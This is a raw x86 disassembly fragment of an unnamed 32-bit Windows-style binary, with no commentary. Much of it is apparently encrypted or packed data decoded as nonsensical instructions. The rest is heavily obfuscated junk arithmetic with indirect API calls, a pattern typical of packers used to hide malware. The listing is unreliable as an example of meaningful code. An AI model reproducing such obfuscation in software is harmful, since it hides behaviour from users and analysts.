  40222b:	fdivr  DWORD PTR [edx+0x3e]
  40222e:	or     eax,0x139edad8
  402233:	sub    ah,BYTE PTR [ecx+0x5d]
  402236:	xor    esp,eax
  402238:	(bad)
  40223c:	and    eax,0x56d8e112
  402241:	pop    ds
  402242:	adc    eax,0xf4a2aa01
  402247:	pop    edx
  402248:	add    BYTE PTR [ecx],0x67
  40224b:	cmc    
  40224c:	xor    edx,DWORD PTR [esi-0x557511b]
  402252:	mov    BYTE PTR [edi],bl
  402254:	jne    0x4021e7
  402256:	pop    ds
  402257:	push   esi
  402258:	fdiv   DWORD PTR [edi+0x7]
  40225b:	sbb    dl,BYTE PTR [esi]
  40225d:	icebp  
  40225e:	jae    0x4022b0
  402260:	lds    esp,FWORD PTR [ebx-0x53]
  402263:	adc    ch,BYTE PTR [ebx-0x26d10c2d]
  402269:	xchg   ebp,eax
  40226a:	cli    
  40226b:	cmc    
  40226c:	xchg   BYTE PTR ds:0x3c7dbe3a,ah
  402272:	retf   
  402273:	and    esp,esp
  402275:	in     al,dx
  402276:	stc    
  402277:	sub    edx,DWORD PTR [ebp-0x18]
  40227a:	or     BYTE PTR [ebp+0xa7c25ae],dl
  402280:	test   eax,0xd5a3aa66
  402285:	sbb    esp,DWORD PTR [edi-0x76e6805b]
  40228b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40228c:	add    ah,dh
  40228e:	sbb    edi,eax
  402290:	and    BYTE PTR [esi],dh
  402292:	mov    cl,0x21
  402294:	inc    ecx
  402295:	rcr    BYTE PTR [eax-0x3cde56b2],1
  40229b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40229c:	mov    ah,0x13
  40229e:	mov    fs,WORD PTR gs:[eax+0x379a2e6c]
  4022a5:	scas   al,BYTE PTR es:[edi]
  4022a6:	add    BYTE PTR [ecx],cl
  4022a8:	dec    esp
  4022a9:	push   edi
  4022aa:	jne    0x402300
  4022ac:	fbld   TBYTE PTR [ebp-0x1a]
  4022af:	mov    edx,0x2eee7225
  4022b4:	call   0xb13f9bde
  4022b9:	aad    0x68
  4022bb:	push   ebx
  4022bc:	int    0x6e
  4022be:	inc    ebx
  4022bf:	inc    ebp
  4022c0:	and    BYTE PTR [edx+0x7a],al
  4022c3:	mov    esi,0x5a613978
  4022c8:	rcl    DWORD PTR [eax+ebx*2-0x4b20ba8d],0x7d
  4022d0:	sub    ebx,DWORD PTR [ebx-0x24]
  4022d3:	sub    eax,0x86b83fbc
  4022d8:	push   ss
  4022d9:	jge    0x4022ad
  4022db:	addr16 loopne 0x4022c9
  4022de:	sub    al,0x3c
  4022e0:	xchg   ebx,eax
  4022e1:	cdq    
  4022e2:	arpl   cx,si
  4022e4:	mov    dh,0x67
  4022e6:	jmp    0xd01486e0
  4022eb:	or     eax,0x99ebde05
  4022f0:	cmp    dl,BYTE PTR [ebx+edi*1+0x47]
  4022f4:	and    dl,BYTE PTR [ecx-0x9]
  4022f7:	push   eax
  4022f8:	cmp    DWORD PTR [ebx+0x22],0x4d
  4022fc:	push   0xffffffa2
  4022fe:	inc    eax
  4022ff:	jnp    0x40237a
  402301:	jb     0x4022ab
  402303:	mov    esi,0x2ed3b95c
  402308:	or     eax,0xd9ee1c39
  40230d:	adc    al,0x6
  40230f:	sbb    al,0x61
  402311:	loopne 0x4022b3
  402313:	mov    bh,0x90
  402315:	into   
  402316:	add    eax,0x1cab4039
  40231b:	pop    eax
  40231c:	int3   
  40231d:	jmp    0xc8f39ac1
  402322:	jg     0x4022b8
  402324:	cmp    BYTE PTR [ebx+ebx*8-0x7bc43090],bl
  40232b:	push   edx
  40232c:	push   ss
  40232d:	(bad)  
  40232e:	(bad)  
  40232f:	pop    edi
  402330:	ror    DWORD PTR [ebp-0x24],0x10
  402334:	scas   al,BYTE PTR es:[edi]
  402335:	inc    ecx
  402336:	leave  
  402337:	lods   eax,DWORD PTR ds:[esi]
  402338:	test   esp,0x8f71b073
  40233e:	add    DWORD PTR [esp+edi*4+0x2adac03c],esp
  402345:	js     0x40230d
  402347:	pop    ebp
  402348:	xor    al,0xa6
  40234a:	(bad)  
  40234b:	fs das 
  40234d:	stos   BYTE PTR es:[edi],al
  40234e:	mov    ebx,0x3caec0a1
  402353:	push   es
  402354:	inc    ecx
  402355:	mov    al,ds:0x209cd749
  40235a:	fstp   TBYTE PTR [ebx]
  40235c:	data16 rcr BYTE PTR [esp+esi*4+0x38],cl
  402361:	(bad)
  402365:	mov    ds:0x9263a2e4,al
  40236a:	jle    0x402344
  40236c:	test   eax,0xb956cbc3
  402371:	xchg   ebp,eax
  402372:	add    DWORD PTR [eax+0x16f21174],edx
  402378:	dec    edx
  402379:	or     edi,DWORD PTR [edx]
  40237b:	sub    al,0xc9
  40237d:	xchg   ebp,eax
  40237e:	jl     0x4023e5
  402380:	fdiv   QWORD PTR [edx+0x27e8755d]
  402386:	shl    dl,1
  402388:	cmp    eax,0x6201baab
  40238d:	stos   BYTE PTR es:[edi],al
  40238e:	xchg   edi,eax
  40238f:	punpcklbw mm2,DWORD PTR [edx+0x4307d8af]
  402396:	aas    
  402397:	leave  
  402398:	ror    DWORD PTR ds:0x14ccc908,0x70
  40239f:	push   ebx
  4023a0:	pushf  
  4023a1:	pop    es
  4023a2:	data16 int 0x4c
  4023a5:	mov    dl,BYTE PTR ds:0xaa3e46e7
  4023ab:	mov    eax,ds:0x3da4079c
  4023b0:	sti    
  4023b1:	pusha  
  4023b2:	in     al,dx
  4023b3:	ror    BYTE PTR [ecx],0xa3
  4023b6:	ins    BYTE PTR es:[edi],dx
  4023b7:	xchg   BYTE PTR [ebx+0x1f],cl
  4023ba:	push   edi
  4023bb:	int3   
  4023bc:	add    bl,bh
  4023be:	and    al,0x5
  4023c0:	jp     0x4023b1
  4023c2:	push   esp
  4023c3:	cmp    al,0x33
  4023c5:	push   edx
  4023c6:	imul   esi,esp,0x2f
  4023c9:	fisttp DWORD PTR [ecx]
  4023cb:	std    
  4023cc:	test   BYTE PTR [ebp-0x4e],0x14
  4023d0:	retf   0x18f1
  4023d3:	fld    DWORD PTR ds:0x8c61bf30
  4023d9:	push   0xf422616d
  4023de:	loop   0x40245a
  4023e0:	and    ecx,ecx
  4023e2:	cli    
  4023e3:	jle    0x402399
  4023e5:	mov    esp,0x64fc1c2b
  4023ea:	push   es
  4023eb:	(bad)  [eax+0x4b25659f]
  4023f1:	push   esp
  4023f2:	fbld   TBYTE PTR [ebp-0x57]
  4023f5:	test   DWORD PTR [eax-0x2a],ebx
  4023f8:	stc    
  4023f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023fa:	in     eax,0x49
  4023fc:	mov    eax,0x2d0f68
  402401:	add    BYTE PTR [ecx+0x4284291d],al
  402407:	add    BYTE PTR [ecx-0x7c],dl
  40240a:	inc    edx
  40240b:	add    al,ch
  40240d:	pop    ebx
  40240e:	inc    BYTE PTR [ecx]
  402410:	add    BYTE PTR [ebx+0x158b984d],cl
  402416:	dec    ecx
  402417:	test   BYTE PTR [edx+0x0],al
  40241a:	add    DWORD PTR ds:0x428365,edx
  402420:	mov    edx,DWORD PTR [ebp-0x64]
  402423:	sub    DWORD PTR ds:0x428535,ecx
  402429:	xor    eax,ecx
  40242b:	sub    DWORD PTR ds:0x4284cd,edi
  402431:	mov    ecx,DWORD PTR [ebp-0x70]
  402434:	mov    edx,DWORD PTR [ebp-0x6c]
  402437:	neg    DWORD PTR ds:0x42856d
  40243d:	sub    eax,ecx
  40243f:	mov    ecx,DWORD PTR ds:0x422728
  402445:	lea    eax,[eax+ecx*1-0x27d2]
  40244c:	not    edx
  40244e:	mov    ecx,DWORD PTR [ebp-0x1c]
  402451:	adc    edx,DWORD PTR ds:0x4284b5
  402457:	mov    edx,DWORD PTR [ebp-0x2c]
  40245a:	neg    DWORD PTR ds:0x42842d
  402460:	or     ecx,0x4f00
  402466:	and    ecx,edx
  402468:	cmp    DWORD PTR ds:0x42831d,0x0
  40246f:	mov    DWORD PTR ds:0x428539,ebx
  402475:	mov    edx,DWORD PTR ds:0x428435
  40247b:	jmp    0x4024db
  402480:	mov    DWORD PTR ds:0x428415,0xc4d
  40248a:	cmp    DWORD PTR ds:0x42831d,0x0
  402491:	jg     0x4024b5
  402497:	push   DWORD PTR [ebp-0x24]
  40249a:	push   DWORD PTR [ebp-0x28]
  40249d:	call   DWORD PTR ds:0x42dfe8
  4024a3:	xor    edx,DWORD PTR ds:0x428411
  4024a9:	adc    DWORD PTR ds:0x4284dd,ecx
  4024af:	add    edx,0x747e
  4024b5:	or     DWORD PTR ds:0x42853d,0x36ec
  4024bf:	neg    DWORD PTR ds:0x428535
  4024c5:	adc    edx,DWORD PTR ds:0x428331
  4024cb:	sbb    DWORD PTR ds:0x428571,edi
  4024d1:	sbb    DWORD PTR ds:0x42853d,0x669d
  4024db:	mov    edx,DWORD PTR [ebp-0x34]
  4024de:	or     ecx,edx
  4024e0:	xor    ecx,0x5fdd
  4024e6:	cmp    ecx,DWORD PTR [eax]
  4024e8:	mov    DWORD PTR ds:0x4284e1,0x2fd8
  4024f2:	jne    0x408bb3
  4024f8:	mov    ecx,DWORD PTR [esi]
  4024fa:	cmp    DWORD PTR ds:0x4284f1,0x0
  402501:	mov    DWORD PTR ds:0x428405,edi
  402507:	not    edx
  402509:	mov    DWORD PTR ds:0x4284e1,0x71cc
  402513:	jmp    0x402572
  402518:	mov    eax,ds:0x4284f1
  40251d:	mov    eax,0x2d63
  402522:	cmp    DWORD PTR ds:0x4284f1,0x0
  402529:	je     0x40255f
  40252f:	push   0x428359
  402534:	push   DWORD PTR [ebp-0x18]
  402537:	push   0x428245
  40253c:	push   0x6ba7
  402541:	call   DWORD PTR ds:0x42dfec
  402547:	sbb    edx,DWORD PTR ds:0x428365
  40254d:	xor    edx,DWORD PTR ds:0x42835d
  402553:	and    edx,edx
  402555:	mov    DWORD PTR ds:0x428419,0x7db9
  40255f:	add    DWORD PTR ds:0x428455,edx
  402565:	inc    edx
  402566:	and    DWORD PTR ds:0x428329,ecx
  40256c:	or     DWORD PTR ds:0x428471,ecx
  402572:	mov    eax,DWORD PTR [esi+0x4]
  402575:	shrd   ecx,eax,0x2
  402579:	shr    eax,0x2
  40257c:	adc    DWORD PTR ds:0x428361,ecx
  402582:	mov    eax,DWORD PTR [esi]
  402584:	movzx  edx,BYTE PTR ds:0x428421
  40258b:	or     DWORD PTR ds:0x428555,edx
  402591:	mov    edx,DWORD PTR [esi+0x4]
  402594:	shl    eax,0x1e
  402597:	xor    ecx,edi
  402599:	xor    eax,eax
  40259b:	or     eax,ecx
  40259d:	jmp    0x40293e
  4025a2:	cmp    al,0x5
  4025a4:	ja     0x4025d8
  4025a6:	jl     0x40255c
  4025a8:	mov    esp,0xb45d5307
  4025ad:	iret   
  4025ae:	pop    ecx
  4025af:	popa   
  4025b0:	mov    WORD PTR [esi+edi*4-0x42414126],fs
  4025b7:	les    edi,FWORD PTR [esi-0xb951842]
  4025bd:	xchg   ecx,eax
  4025be:	int    0x43
  4025c0:	ret    0x1030
  4025c3:	cmc    
  4025c4:	imul   ebp,ebx,0x7
  4025c7:	mov    ebp,0xac1b068f
  4025cc:	mov    ecx,0x80d6e700
  4025d1:	lds    edx,FWORD PTR ds:[ecx]
  4025d4:	cmp    BYTE PTR [ebp+0x93123f0],0x59
  4025db:	adc    eax,0x27dc2fa
  4025e0:	xchg   esi,eax
  4025e1:	xlat   BYTE PTR ds:[ebx]
  4025e2:	cmp    ecx,DWORD PTR [ebx+0x58964dbf]
  4025e8:	aas    
  4025e9:	pop    es
  4025ea:	ds sbb dh,ch
  4025ed:	jae    0x402628
  4025ef:	in     al,dx
  4025f0:	mov    edx,0x4f975775
  4025f5:	mov    bl,0x32
  4025f7:	(bad)  
  4025f8:	push   0xffffffea
  4025fa:	lahf   
  4025fb:	cmp    esp,DWORD PTR [ecx+edx*2-0x78074ade]
  402602:	cld    
  402603:	imul   esp,DWORD PTR [ecx],0x5c773e05
  402609:	cmc    
  40260a:	scas   eax,DWORD PTR es:[edi]
  40260b:	jmp    0x9486d282
  402610:	hlt    
  402611:	pop    ecx
  402612:	(bad)  
  402613:	jge    0x40263e
  402615:	cwde   
  402616:	sub    BYTE PTR ds:[edx],al
  402619:	sbb    dh,bl
  40261b:	dec    edi
  40261c:	lea    ecx,[edx+eiz*1]
  40261f:	aad    0x88
  402621:	ret    
  402622:	jle    0x4025e3
  402624:	cmp    cl,BYTE PTR [ecx]
  402626:	cmp    DWORD PTR [edx+ebp*8-0x60],eax
  40262a:	sub    eax,0x70bb1550
  40262f:	cdq    
  402630:	push   eax
  402631:	aad    0x8
  402633:	aaa    
  402634:	push   esp
  402635:	in     eax,0x89
  402637:	mov    ds:0xaad9bbb2,al
  40263c:	or     dl,BYTE PTR ds:0xc35343ff
  402642:	add    DWORD PTR [ecx-0x409039e0],0xe31f3e64
  40264c:	jmp    0xf7f92998
  402651:	jae    0x402637
  402653:	xchg   DWORD PTR [ebx],ebp
  402655:	in     al,dx
  402656:	inc    edi
  402657:	sbb    al,BYTE PTR [ebp-0x2a4e5144]
  40265d:	lahf   
  40265e:	dec    eax
  40265f:	mov    BYTE PTR [ebx+0x6b],0x28
  402663:	clc    
  402664:	push   ebx
  402665:	or     BYTE PTR [eax-0x45],ah
  402668:	dec    ebp
  402669:	lods   eax,DWORD PTR ds:[esi]
  40266a:	loop   0x40265a
  40266c:	mov    al,0xd8
  40266e:	jae    0x402605
  402670:	jbe    0x402693
  402672:	push   esp
  402673:	(bad)  
  402674:	out    dx,eax
  402675:	rol    DWORD PTR [ecx],0x8f
  402678:	(bad)  
  402679:	mov    bl,0xdd
  40267b:	xor    ah,dh
  40267d:	push   0x55895780
  402682:	enter  0xa3ba,0x9c
  402686:	fistp  DWORD PTR [ecx]
  402688:	sub    al,0xab
  40268a:	stc    
  40268b:	cmc    
  40268c:	sbb    cl,BYTE PTR [ecx-0x4d]
  40268f:	push   edi
  402690:	mov    dh,BYTE PTR ds:0x15fbb753
  402696:	jmp    0x9097b234
  40269b:	scas   eax,DWORD PTR es:[edi]
  40269c:	cmp    ch,BYTE PTR [ecx+0xf50d941]
  4026a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026a3:	mov    esp,0x538734f6
  4026a8:	push   esi
  4026a9:	mov    ebx,0x2ab78df2
  4026ae:	cdq    
  4026af:	outs   dx,DWORD PTR ds:[esi]
  4026b0:	dec    eax
  4026b1:	dec    esi
  4026b2:	add    DWORD PTR [edi],edx
  4026b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026b5:	cmp    ch,BYTE PTR [ecx+0x52025966]
  4026bb:	xchg   edi,eax
  4026bc:	fs loopne 0x4026df
  4026bf:	add    al,0x78
  4026c1:	cld    
  4026c2:	sahf   
  4026c3:	shl    BYTE PTR [ebp-0x2de5273],cl
  4026c9:	arpl   WORD PTR [eax-0x2c],dx
  4026cc:	pxor   mm1,mm4
  4026cf:	int3   
  4026d0:	push   0x8
  4026d2:	jmp    0x40268b
  4026d4:	jnp    0x4026ca
  4026d6:	sbb    eax,ebx
  4026d8:	sub    DWORD PTR [edx],ebp
  4026da:	and    ah,dl
  4026dc:	jmp    0xf6129e57
  4026e1:	push   DWORD PTR [edx+0x46]
  4026e4:	jnp    0x4026de
  4026e6:	jle    0x4026a7
  4026e8:	std    
  4026e9:	lss    eax,FWORD PTR [edx]
  4026ec:	xor    al,0xc6
  4026ee:	inc    ebx
  4026ef:	mov    DWORD PTR [esi],edx
  4026f1:	push   cs
  4026f2:	out    dx,al
  4026f3:	mov    esp,0x31a54d71
  4026f8:	icebp  
  4026f9:	hlt    
  4026fa:	pop    eax
  4026fb:	push   esp
  4026fc:	das    
  4026fd:	arpl   WORD PTR [ecx-0x5eb3adff],di
  402703:	lods   eax,DWORD PTR ds:[esi]
  402704:	ret    0xd1dc
  402707:	stc    
  402708:	inc    ebx
  40270a:	bound  esi,QWORD PTR [ebx+0x66]
  40270d:	mov    ebp,0xb787785e
  402712:	sub    ch,dh
  402714:	in     al,0xb5
  402716:	mov    ch,0x65
  402718:	jo     0x40269e
  40271a:	jo     0x40273a
  40271c:	lds    ebx,FWORD PTR [ecx]
  40271e:	std    
  40271f:	add    eax,0xc1b79d2f
  402724:	out    dx,al
  402725:	or     eax,eax
  402727:	je     0x4026f0
  402729:	jbe    0x402720
  40272b:	mov    ?,WORD PTR ds:0xdf166555
  402731:	shl    BYTE PTR [eax],1
  402733:	cmp    ecx,DWORD PTR [esi+eiz*8-0x4ba26db7]
  40273a:	jle    0x402761
  40273c:	shl    al,0x37
  40273f:	jno    0x4027a9
  402741:	lahf   
  402742:	pop    esp
  402743:	retf   
  402744:	dec    ecx
  402745:	in     eax,0xbd
  402747:	test   eax,0x8cfa2e21
  40274c:	fwait
  40274d:	(bad)  
  40274e:	fwait
  40274f:	xchg   esp,eax
  402750:	addr16 xchg edx,eax
  402752:	inc    ebp
  402753:	and    DWORD PTR [eax+0x63],0x250ab8dd
  40275a:	(bad)  
  40275b:	fiadd  WORD PTR [eax-0x66ad25c6]
  402761:	scas   eax,DWORD PTR es:[edi]
  402762:	and    eax,DWORD PTR [eax+0x7b9d5eb9]
  402768:	mov    al,0x77
  40276a:	(bad)  
  40276b:	xor    DWORD PTR [ecx-0x6c],ebx
  40276e:	cmp    BYTE PTR [edi],cl
  402770:	fs jne 0x402733
  402773:	push   ebp
  402774:	ja     0x4027ad
  402776:	jecxz  0x4027a4
  402778:	(bad)  
  402779:	mov    esi,0x6d362b1
  40277e:	dec    edx
  40277f:	leave  
  402780:	sub    DWORD PTR [eax+ebp*4],ecx
  402783:	ds push esp
  402785:	ficom  DWORD PTR [ecx+0x632933de]
  40278b:	push   eax
  40278c:	scas   eax,DWORD PTR es:[edi]
  40278d:	jb     0x402796
  40278f:	or     DWORD PTR [ebx+0x5b17e1ed],eax
  402795:	inc    ecx
  402796:	rcl    BYTE PTR [edi+0x44bed9de],0xcc
  40279d:	daa    
  40279e:	retf   0xab73
  4027a1:	retf   0x88a6
  4027a4:	adc    BYTE PTR gs:[esi-0x626e79],bh
  4027ab:	mov    esi,0x5678ff72
  4027b0:	clc    
  4027b1:	ds jno 0x402825
  4027b4:	mov    ds:0x53d5866d,al
  4027b9:	adc    BYTE PTR [eax-0x32858216],0x3a
  4027c0:	int    0xeb
  4027c2:	ret    0x49fb
  4027c5:	cmp    eax,0x40476d3e
  4027ca:	mul    DWORD PTR [esi-0x28]
  4027cd:	sahf   
  4027ce:	sub    esi,edx
  4027d0:	cld    
  4027d1:	dec    ebx
  4027d2:	and    DWORD PTR ds:0xc5e90b94,0xffffffaa
  4027d9:	dec    esi
  4027da:	mov    ch,0xde
  4027dc:	and    al,0x4b
  4027de:	cmp    ch,BYTE PTR [edx-0x5]
  4027e1:	jae    0x402818
  4027e3:	cli    
  4027e4:	outs   dx,BYTE PTR ds:[esi]
  4027e5:	fdiv   QWORD PTR [edi+0x6da5cf3a]
  4027eb:	sub    DWORD PTR [edi+0x2b2caa3],edx
  4027f1:	mov    esi,0x85d8283e
  4027f6:	div    ch
  4027f8:	loope  0x4027ba
  4027fa:	xor    al,0xc4
  4027fc:	dec    edi
  4027fd:	loope  0x4027ea
  4027ff:	xchg   edi,eax
  402800:	or     al,0xb2
  402802:	int    0xcd
  402804:	cmp    ebp,DWORD PTR [ecx+0x69]
  402807:	xchg   edi,eax
  402808:	in     al,0xce
  40280a:	sub    BYTE PTR [eax+0x6f12beda],bl
  402810:	add    DWORD PTR ds:0x9c77b8e5,0x36
  402817:	dec    edi
  402818:	mov    bh,0x1d
  40281a:	fld    QWORD PTR [ecx-0x733b16bb]
  402820:	scas   al,BYTE PTR es:[edi]
  402821:	xor    eax,0xd1ec3953
  402826:	fsub   QWORD PTR [ecx]
  402828:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40282a:	push   0xfe718736
  40282f:	iret   
  402830:	outs   dx,BYTE PTR ds:[esi]
  402831:	xor    DWORD PTR [esi-0x66],edi
  402834:	mov    ebp,0x1f150195
  402839:	push   ebx
  40283a:	push   ebx
  40283b:	adc    BYTE PTR [eax+0x77],0xdc
  40283f:	out    0x1,eax
  402841:	stc    
  402842:	mov    dh,BYTE PTR [eax-0x19]
  402845:	mov    BYTE PTR [ecx+0x47ab5f50],bh
  40284b:	adc    DWORD PTR [edi],0xd320ea4f
  402851:	mov    bh,0xa
  402853:	(bad)  
  402855:	sbb    DWORD PTR [edx+0x1e7e969b],ebp
  40285b:	lods   al,BYTE PTR ds:[esi]
  40285c:	sub    dl,BYTE PTR [ecx]
  40285e:	adc    bh,BYTE PTR [ebp-0x35d44d09]
  402864:	mov    ds:0x9a92057a,al
  402869:	sub    al,0x3a
  40286b:	sub    eax,0x12432661
  402870:	and    DWORD PTR [edi-0x51557a4d],ebx
  402876:	adc    BYTE PTR [ebp-0x6d99e46f],ah
  40287c:	shl    DWORD PTR [eax-0xadb253b],cl
  402882:	es mov dl,0x14
  402885:	loop   0x4028f0
  402887:	xlat   BYTE PTR ds:[ebx]
  402888:	js     0x4028dc
  40288a:	cmc    
  40288b:	in     eax,dx
  40288c:	stos   DWORD PTR es:[edi],eax
  40288d:	push   es
  40288e:	adc    DWORD PTR [ecx+0x207bb2b9],edi
  402894:	out    dx,al
  402895:	repz sahf 
  402897:	cs pop edx
  402899:	ja     0x4028ca
  40289b:	xlat   BYTE PTR ds:[ebx]
  40289c:	std    
  40289d:	int    0xa8
  40289f:	sub    eax,0x42fc1db9
  4028a4:	mov    ebx,0x82a9fa18
  4028a9:	push   edx
  4028aa:	mov    DWORD PTR [edx-0x591bd345],esp
  4028b0:	lods   al,BYTE PTR ds:[esi]
  4028b1:	push   esi
  4028b2:	enter  0x1770,0x67
  4028b6:	xchg   DWORD PTR [ebp-0x1e7b09ac],edx
  4028bc:	pop    edi
  4028bd:	cs inc edx
  4028bf:	mov    edx,DWORD PTR [edi]
  4028c1:	cmp    ah,bh
  4028c3:	mov    esi,0x42dae760
  4028c8:	rcr    esi,0x32
  4028cb:	rol    DWORD PTR [edi+0x43],cl
  4028ce:	repnz aam 0xa8
  4028d1:	clc    
  4028d2:	xor    dl,ah
  4028d4:	sub    DWORD PTR [eax],0xc7fe64a0
  4028da:	aas    
  4028db:	fdivr  QWORD PTR [ebp+0x7480e9c2]
  4028e1:	ror    bl,cl
  4028e3:	shr    DWORD PTR [ebp-0x74],cl
  4028e6:	mov    dh,0x13
  4028e8:	push   edi
  4028e9:	loop   0x4028a0
  4028eb:	pop    edi
  4028ec:	xor    DWORD PTR [ebx+0x45153f3e],esi
  4028f2:	pop    ebp
  4028f3:	(bad)  [esi-0x21]
  4028f6:	xor    BYTE PTR [ebx],al
  4028f8:	(bad)  
  4028f9:	lahf   
  4028fa:	mov    eax,0x7b059ea7
  4028ff:	mov    al,ds:0x2f2bd076
  402904:	xor    eax,0x7cc8e71
  402909:	or     DWORD PTR [edx-0x7de78be1],edi
  40290f:	and    eax,0x24b79bd5
  402914:	jl     0x402936
  402916:	sar    esi,0x3d
  402919:	pop    ds
  40291a:	test   cl,ah
  40291c:	(bad)  
  40291d:	jne    0x4028a5
  40291f:	std    
  402920:	inc    edx
  402921:	pop    edi
  402922:	test   eax,0x407a338e
  402927:	test   BYTE PTR [eax],ch
  402929:	addr16 add al,0x3a
  40292c:	dec    edi
  40292d:	push   edi
  40292e:	loop   0x4028c5
  402930:	xchg   al,ch
  402932:	scas   eax,DWORD PTR es:[edi]
  402933:	cmp    BYTE PTR [ebx+0x31ff999d],bh
  402939:	cmp    esi,esi
  40293b:	lea    edx,[esp+esi*1-0x75]
  40293f:	dec    ebp
  402940:	in     al,dx
  402941:	cmp    eax,DWORD PTR [ecx]
  402943:	mov    DWORD PTR ds:0x428419,0x7e19
  40294d:	jne    0x402a3a
  402953:	cmp    DWORD PTR ds:0x4284e1,0x0
  40295a:	mov    DWORD PTR ds:0x428535,edi
  402960:	mov    ecx,0x5bac
  402965:	mov    ecx,0x785
  40296a:	jmp    0x4029c0
  40296f:	mov    DWORD PTR ds:0x4284e5,0x7d3d
  402979:	mov    eax,ds:0x428341
  40297e:	cmp    DWORD PTR ds:0x4284e1,0x0
  402985:	jl     0x4029a6
  40298b:	push   0x25e9
  402990:	call   DWORD PTR ds:0x42e238
  402996:	and    ecx,0x7efc
  40299c:	and    DWORD PTR ds:0x428471,0x428359
  4029a6:	sub    edx,edx
  4029a8:	and    DWORD PTR ds:0x428545,0x3b56
  4029b2:	mov    edx,DWORD PTR ds:0x42851d
  4029b8:	mov    edx,DWORD PTR [edx]
  4029ba:	add    DWORD PTR ds:0x428435,edx
  4029c0:	mov    eax,DWORD PTR [ebp-0xc]
  4029c3:	mov    ecx,DWORD PTR [ebp+0x20]
  4029c6:	sub    DWORD PTR ds:0x428365,edi
  4029cc:	xor    DWORD PTR [eax],ecx
  4029ce:	mov    eax,DWORD PTR [ebp-0xc]
  4029d1:	or     edx,ecx
  4029d3:	mov    ecx,DWORD PTR [ebp+0x18]
  4029d6:	or     DWORD PTR ds:0x428441,ebx
  4029dc:	mov    edx,DWORD PTR [ebp+0x1c]
  4029df:	add    DWORD PTR ds:0x42833d,0x2a87
  4029e9:	shrd   ecx,edx,0x2
  4029ed:	sub    DWORD PTR ds:0x42844d,0x428425
  4029f7:	mov    DWORD PTR [ebp-0x14],ecx
  4029fa:	mov    ecx,DWORD PTR [ebp+0x18]
  4029fd:	xor    DWORD PTR [ebp-0x14],edi
  402a00:	shr    edx,0x2
  402a03:	xor    edx,0x4270
  402a09:	mov    edx,DWORD PTR [ebp+0x1c]
  402a0c:	sbb    DWORD PTR ds:0x4283f9,0x428415
  402a16:	xor    edx,edx
  402a18:	and    DWORD PTR ds:0x428569,0x428321
  402a22:	or     edx,DWORD PTR [ebp-0x14]
  402a25:	or     DWORD PTR ds:0x428441,0x6ae7
  402a2f:	shl    ecx,0x1e
  402a32:	xor    DWORD PTR ds:0x428359,edx
  402a38:	sub    DWORD PTR [eax],edx
  402a3a:	xor    ecx,ecx
  402a3c:	add    ecx,DWORD PTR ds:0x4284b1
  402a42:	mov    eax,ds:0x428529
  402a47:	sub    eax,ecx
  402a49:	add    ecx,DWORD PTR [ecx+eax*1]
  402a4c:	mov    eax,ds:0x422570
  402a51:	add    edx,DWORD PTR ds:0x428355
  402a57:	mov    ecx,DWORD PTR [ebp-0xc]
  402a5a:	cmp    DWORD PTR ds:0x428409,0x0
  402a61:	not    edx
  402a63:	not    DWORD PTR ds:0x42833d
  402a69:	movzx  edx,WORD PTR ds:0x42832d
  402a70:	jmp    0x402ae1
  402a75:	mov    edx,0x6743
  402a7a:	cmp    DWORD PTR ds:0x428409,0x0
  402a81:	jg     0x402ac1
  402a87:	push   0x8e71
  402a8c:	push   DWORD PTR [ebp-0x1c]
  402a8f:	call   DWORD PTR ds:0x42dff0
  402a95:	movzx  edx,WORD PTR ds:0x428459
  402a9c:	sbb    edx,DWORD PTR ds:0x428551
  402aa2:	mov    DWORD PTR ds:0x428459,edx
  402aa8:	movzx  edx,BYTE PTR ds:0x428461
  402aaf:	adc    DWORD PTR ds:0x428539,edx
  402ab5:	or     edx,0x3af6
  402abb:	and    edx,DWORD PTR ds:0x42831d
  402ac1:	or     DWORD PTR ds:0x428359,0x67f9
  402acb:	add    edx,0x3b45
  402ad1:	or     edx,DWORD PTR ds:0x4284c1
  402ad7:	adc    DWORD PTR ds:0x428539,0x3eb0
  402ae1:	mov    eax,DWORD PTR [eax]
  402ae3:	cmp    DWORD PTR ds:0x428341,0x0
  402aea:	mov    DWORD PTR ds:0x4284c9,0xab9
  402af4:	mov    edx,DWORD PTR ds:0x42835d
  402afa:	mov    DWORD PTR ds:0x428331,0x238f
  402b04:	jmp    0x402b79
  402b09:	mov    DWORD PTR ds:0x428565,ecx
  402b0f:	cmp    DWORD PTR ds:0x428341,0x0
  402b16:	ja     0x402b5f
  402b1c:	push   DWORD PTR [ebp-0x14]
  402b1f:	push   0x428181
  402b24:	push   DWORD PTR [ebp-0x10]
  402b27:	push   0x428228
  402b2c:	push   DWORD PTR [ebp-0x18]
  402b2f:	push   0x24b6
  402b34:	call   DWORD PTR ds:0x42e23c
  402b3a:	mov    edx,DWORD PTR ds:0x428365
  402b40:	sub    DWORD PTR ds:0x42834d,edx
  402b46:	sbb    DWORD PTR ds:0x428439,ebx
  402b4c:	movzx  edx,BYTE PTR ds:0x42831d
  402b53:	adc    DWORD PTR ds:0x42845d,edx
  402b59:	add    DWORD PTR ds:0x42855d,ebx
  402b5f:	xor    edx,edx
  402b61:	or     edx,DWORD PTR ds:0x42856d
  402b67:	xor    edx,DWORD PTR ds:0x4284d5
  402b6d:	mov    DWORD PTR ds:0x42856d,edx
  402b73:	add    edx,0x71a6
  402b79:	add    eax,DWORD PTR [ecx]
  402b7b:	sub    ecx,0x1eef
  402b81:	mov    DWORD PTR [ebp-0x14],eax
  402b84:	or     ecx,DWORD PTR ds:0x42844d
  402b8a:	mov    ecx,DWORD PTR [ebx]
  402b8c:	mov    eax,DWORD PTR [ebx+0x4]
  402b8f:	shrd   ecx,eax,0x2
  402b93:	cmp    DWORD PTR ds:0x42831d,0x0
  402b9a:	mov    DWORD PTR ds:0x4284c1,0x61cd
  402ba4:	mov    edx,DWORD PTR ds:0x428329
  402baa:	mov    DWORD PTR ds:0x428335,edx
  402bb0:	jmp    0x402c95
  402bb5:	mov    DWORD PTR ds:0x428339,0x124b
  402bbf:	mov    DWORD PTR ds:0x428411,0x5ddc
  402bc9:	cmp    DWORD PTR ds:0x42831d,0x0
  402bd0:	jle    0x402bf9
  402bd6:	push   0x6f74
  402bdb:	call   DWORD PTR ds:0x42e0ac
